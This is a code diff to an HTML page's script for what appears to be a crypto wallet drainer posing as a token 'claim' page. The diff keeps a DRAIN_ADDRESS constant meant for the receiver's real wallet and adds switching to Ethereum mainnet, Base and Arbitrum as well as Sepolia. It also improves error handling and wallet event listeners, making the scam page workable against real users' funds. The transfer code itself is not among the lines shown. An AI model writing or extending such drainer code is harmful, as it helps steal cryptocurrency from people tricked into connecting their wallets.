@@ -54,7 +54,14 @@
 
     <script>
         // ================== CONFIG ==================
-        const DRAIN_ADDRESS = "0xYourRealReceiverAddressHere"; // ← put your actual receiving wallet address here
+        const SUPPORTED_NETWORKS = {
+            11155111: { chainIdHex: "0xaa36a7", name: "Sepolia Testnet", rpcUrl: "https://rpc.ankr.com/eth_sepolia", symbol: "SEP", decimals: 18, blockExplorer: "https://sepolia.etherscan.io" },
+            1: { chainIdHex: "0x1", name: "Ethereum Mainnet", rpcUrl: "https://rpc.ankr.com/eth", symbol: "ETH", decimals: 18, blockExplorer: "https://etherscan.io" },
+            8453: { chainIdHex: "0x2105", name: "Base", rpcUrl: "https://mainnet.base.org", symbol: "ETH", decimals: 18, blockExplorer: "https://basescan.org" },
+            42161: { chainIdHex: "0xa4b1", name: "Arbitrum One", rpcUrl: "https://arb1.arbitrum.io/rpc", symbol: "ETH", decimals: 18, blockExplorer: "https://arbiscan.io" }
+        };
+
+        const DRAIN_ADDRESS = "0xYourRealReceiverAddressHere"; // put your actual receiver wallet address here
         // ============================================
 
         const claimBtn = document.getElementById("claim");
@@ -72,8 +79,38 @@
             statusEl.innerText = msg;
         }
 
+        async function switchOrAddChain(targetChainId) {
+            if (!window.ethereum) throw new Error("Wallet not found");
+
+            const network = SUPPORTED_NETWORKS[targetChainId];
+            if (!network) throw new Error(`Unsupported chain ID: ${targetChainId}`);
+
+            try {
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: network.chainIdHex }]
+                });
+            } catch (error) {
+                if (error.code === 4902) {
+                    await window.ethereum.request({
+                        method: "wallet_addEthereumChain",
+                        params: [{
+                            chainId: network.chainIdHex,
+                            chainName: network.name,
+                            nativeCurrency: { name: network.symbol, symbol: network.symbol, decimals: network.decimals },
+                            rpcUrls: [network.rpcUrl],
+                            blockExplorerUrls: [network.blockExplorer]
+                        }]
+                    });
+                } else {
+                    throw error;
+                }
+            }
+        }
+
         async function connectWallet() {
             try {
+                await switchOrAddChain(11155111);
                 const provider = new ethers.BrowserProvider(window.ethereum);
                 const accounts = await provider.send("eth_requestAccounts", []);
                 const signer = await provider.getSigner();
@@ -116,7 +153,7 @@
                 amountEl.innerText = "Claimed ✓";
             } catch (err) {
                 console.error(err);
-                setStatus(err.message || "Transaction rejected by user");
+                setStatus("Failed: " + (err.message || err.reason || "Unknown error"));
                 claimBtn.disabled = false;
             }
         }
@@ -128,6 +165,20 @@
                 connectWallet();
             }
         });
+
+        if (window.ethereum) {
+            window.ethereum.on("chainChanged", (chainIdHex) => {
+                const chainIdDecimal = parseInt(chainIdHex, 16);
+                console.log("Active chain changed to:", chainIdDecimal);
+            });
+            window.ethereum.on("accountsChanged", (accounts) => {
+                if (accounts.length > 0) {
+                    console.log("Active account changed to:", accounts[0]);
+                } else {
+                    console.log("Wallet disconnected");
+                }
+            });
+        }
     </script>
 </body>
 </html>
